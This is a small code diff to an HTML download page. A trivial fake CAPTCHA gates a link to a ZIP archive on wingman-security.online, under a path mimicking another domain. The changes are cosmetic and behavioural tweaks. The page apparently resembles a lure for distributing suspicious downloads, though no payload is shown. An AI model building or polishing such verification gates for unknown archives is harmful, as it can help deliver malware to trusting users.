@@ -5,6 +5,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Download</title>
+
 <style>
     body {
         font-family: Arial, sans-serif;
@@ -76,8 +77,13 @@
         display: none;
         margin-top: 20px;
     }
+
+    #download a {
+        color: #0645ad;
+    }
 </style>
 </head>
+
 <body>
 
 <h2>Download:</h2>
@@ -98,7 +104,7 @@
 
 <div id="download">
     <p>Verification complete!</p>
-    <a href="http://wingman-security.online/drive/sonytracker.com/A7.zip">
+    <a href="https://wingman-security.online/drive/sonytracker.com/A7.zip">
         Click me to download
     </a>
 </div>
@@ -113,6 +119,7 @@
 
     let correct = new Set();
     let selected = new Set();
+    let retryTimer;
 
     function shuffle(array) {
         for (let i = array.length - 1; i > 0; i--) {
@@ -123,21 +130,26 @@
     }
 
     function newChallenge() {
+        clearTimeout(retryTimer);
+
         grid.innerHTML = "";
         selected.clear();
         correct.clear();
+
         download.style.display = "none";
         captcha.style.display = "block";
+        verifyButton.disabled = false;
         message.textContent = "Select matching squares";
 
-        // Randomize the digits and the positions of the 1s.
         const values = shuffle([
             "1", "1", "1", "1",
             "2", "3", "4", "5", "6"
         ]);
 
         values.forEach((value, index) => {
-            if (value === "1") correct.add(index);
+            if (value === "1") {
+                correct.add(index);
+            }
 
             const tile = document.createElement("button");
             tile.type = "button";
@@ -172,8 +184,10 @@
             captcha.style.display = "none";
             download.style.display = "block";
         } else {
+            verifyButton.disabled = true;
             message.textContent = "Try again!";
-            setTimeout(newChallenge, 700);
+
+            retryTimer = setTimeout(newChallenge, 700);
         }
     });
 
